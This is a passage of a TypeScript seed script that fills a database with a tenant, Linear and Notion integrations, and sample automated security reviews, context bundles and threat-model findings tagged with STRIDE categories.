  const tenant = await db.tenant.upsert({
    where: { workosOrgId: WORKOS_ORG_ID },
    update: {},
    create: {
      name: TENANT_NAME,
      workosOrgId: WORKOS_ORG_ID,
    },
  });
  console.log(`Tenant: ${tenant.id} (${tenant.name})`);

  // 2. Upsert integrations
  const integration = await db.integration.upsert({
    where: { tenantId_provider: { tenantId: tenant.id, provider: "LINEAR" } },
    update: {},
    create: { tenantId: tenant.id, provider: "LINEAR", status: "ACTIVE", externalId: "linear_workspace_seed" },
  });
  const notionIntegration = await db.integration.upsert({
    where: { tenantId_provider: { tenantId: tenant.id, provider: "NOTION" } },
    update: {},
    create: { tenantId: tenant.id, provider: "NOTION", status: "ACTIVE", externalId: "notion_workspace_seed" },
  });
  console.log(`Integrations: LINEAR (${integration.id}), NOTION (${notionIntegration.id})`);

  const integrations = { LINEAR: integration, NOTION: notionIntegration };

  // Fetch projects
  const projects = await db.project.findMany({
    where: { tenantId: tenant.id },
    select: { id: true },
  });
  if (projects.length === 0) {
    console.error("No projects found! Run seed-projects.ts first.");
    process.exit(1);
  }
  console.log(`Found ${projects.length} projects\n`);

  // 3. Delete existing seed findings, reviews, bundles, events for clean re-seed
  await db.finding.deleteMany({ where: { review: { tenantId: tenant.id } } });
  await db.review.deleteMany({ where: { tenantId: tenant.id } });
  await db.contextBundle.deleteMany({ where: { tenantId: tenant.id } });
  await db.event.deleteMany({ where: { tenantId: tenant.id } });
  console.log("Cleared existing seed data\n");

  const baseDate = new Date();
  let createdBundles = 0;
  let createdReviews = 0;
  let createdFindings = 0;

  // 4. Seed detailed reviews (with custom findings)
  for (let i = 0; i < REVIEWS.length; i++) {
    const r = REVIEWS[i];
    const eventDate = new Date(baseDate.getTime() - i * 3 * 3_600_000);
    const projectId = projects[i % projects.length].id;

    const event = await db.event.create({
      data: {
        tenantId: tenant.id,
        integrationId: integrations[r.source].id,
        source: r.source,
        externalId: r.externalId,
        type: "issue.created",
        status: "COMPLETED",
        payload: { title: r.title, description: r.summary },
        processedAt: eventDate,
        createdAt: eventDate,
      },
    });

    const bundle = await db.contextBundle.create({
      data: {
        tenantId: tenant.id,
        eventId: event.id,
        projectId,
        status: r.bundleStatus,
        riskLevel: r.riskLevel,
        title: r.title,
        summary: r.summary,
        content: { source: r.source.toLowerCase(), issueKey: r.externalId, description: r.summary },
        createdAt: eventDate,
      },
    });
    createdBundles++;

    const review = await db.review.create({
      data: {
        tenantId: tenant.id,
        contextBundleId: bundle.id,
        status: r.reviewStatus as any,
        mode: "AUTOMATED",
        severity: r.riskLevel === "INFO" ? "LOW" : (r.riskLevel as any),
        confidence: 0.75 + Math.random() * 0.2,
        summary: r.summary,
        modelUsed: "amazon.nova-pro-v1:0",
        createdAt: eventDate,
      },
    });
    createdReviews++;

    for (const f of r.findings) {
      await db.finding.create({
        data: {
          reviewId: review.id,
          type: f.type,
          title: f.title,
          description: f.description,
          severity: f.severity,
          confidence: 0.7 + Math.random() * 0.25,
          strideCategory: f.strideCategory,
          effortEstimate: f.effortEstimate,
          status: f.status,
          createdAt: eventDate,
        },
      });
      createdFindings++;
    }
  }

  // 5. Seed extra reviews (with auto-generated findings for volume)
  for (let i = 0; i < EXTRA_REVIEWS.length; i++) {
    const r = EXTRA_REVIEWS[i];
    const eventDate = new Date(baseDate.getTime() - (REVIEWS.length + i) * 3 * 3_600_000);
    const projectId = projects[(REVIEWS.length + i) % projects.length].id;

    const event = await db.event.create({
      data: {
        tenantId: tenant.id,
        integrationId: integrations[r.source].id,
        source: r.source,
        externalId: r.externalId,
        type: "issue.created",
        status: "COMPLETED",
        payload: { title: r.title, description: r.summary },
        processedAt: eventDate,
        createdAt: eventDate,
      },
    });

    const bundle = await db.contextBundle.create({
      data: {
        tenantId: tenant.id,
        eventId: event.id,
        projectId,
        status: r.bundleStatus,
        riskLevel: r.riskLevel,
        title: r.title,
        summary: r.summary,
        content: { source: r.source.toLowerCase(), issueKey: r.externalId, description: r.summary },
        createdAt: eventDate,
      },
    });
    createdBundles++;

    if (r.bundleStatus === "COMPLETED" || r.bundleStatus === "REVIEWING") {
      const review = await db.review.create({
        data: {
          tenantId: tenant.id,
          contextBundleId: bundle.id,
          status: r.reviewStatus as any,
          mode: "AUTOMATED",
          severity: r.riskLevel === "INFO" ? "LOW" : (r.riskLevel as any),
          confidence: 0.7 + Math.random() * 0.25,
          summary: r.summary,
          modelUsed: "amazon.nova-pro-v1:0",
          createdAt: eventDate,
        },
      });
      createdReviews++;

      // Generate 3 findings per extra review
      const findingTemplates = [
        { type: "THREAT" as const, prefix: "Primary attack vector:", strideIdx: i },
        { type: "REQUIREMENT" as const, prefix: "Security requirement:", strideIdx: i + 1 },
        { type: "MITIGATION" as const, prefix: "Recommended remediation:", strideIdx: i + 2 },
      ];

      for (const ft of findingTemplates) {
        await db.finding.create({
          data: {
            reviewId: review.id,
            type: ft.type,
            title: `${ft.type}: ${r.title.split(" ").slice(0, 5).join(" ")}`,
            description: `${ft.prefix} ${r.summary.slice(0, 200)}`,
            severity: SEVERITIES[(i + findingTemplates.indexOf(ft)) % SEVERITIES.length],
            confidence: 0.65 + Math.random() * 0.3,
            strideCategory: STRIDE[ft.strideIdx % STRIDE.length],
            effortEstimate: (["LOW", "MEDIUM", "HIGH"] as const)[findingTemplates.indexOf(ft) % 3],
            status: (["OPEN", "ACCEPTED", "OPEN"] as const)[findingTemplates.indexOf(ft) % 3],
            createdAt: eventDate,
          },
        });
        createdFindings++;
      }
    }
  }

  console.log(`\nSeeding complete:`);
  console.log(`  Context Bundles: ${createdBundles}`);
  console.log(`  Reviews: ${createdReviews}`);
  console.log(`  Findings: ${createdFindings}`);

  const bundleCount = await db.contextBundle.count({ where: { tenantId: tenant.id } });
  const reviewCount = await db.review.count({ where: { tenantId: tenant.id } });
  const findingCount = await db.finding.count();
  console.log(`\nVerification: ${bundleCount} bundles, ${reviewCount} reviews, ${findingCount} findings in DB`);
}

main()
  .then(() => { process.exit(0); })
  .catch((e) => { console.error("Seed failed:", e); process.exit(1); });
